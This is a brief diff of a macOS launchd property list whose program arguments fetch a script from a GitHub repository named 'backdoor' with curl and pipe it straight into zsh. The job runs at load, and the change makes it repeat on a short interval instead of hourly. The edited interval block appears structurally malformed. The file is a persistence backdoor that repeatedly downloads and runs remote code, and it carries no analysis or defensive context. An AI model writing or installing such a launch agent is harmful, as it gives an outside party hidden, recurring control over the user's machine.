@@ -10,10 +10,9 @@
        <string>-c</string>
        <string>curl -S "https://raw.githubusercontent.com/Wolfoverflow/backdoor/main/script" | zsh</string>
    </array>
-   <key>StartCalendarInterval</key>
+   <key>StartInterval</key>
    <dict>
-       <key>Minute</key>
-       <integer>0</integer>
+       <integer>1</integer>
    </dict>
    <key>RunAtLoad</key>
    <true/>
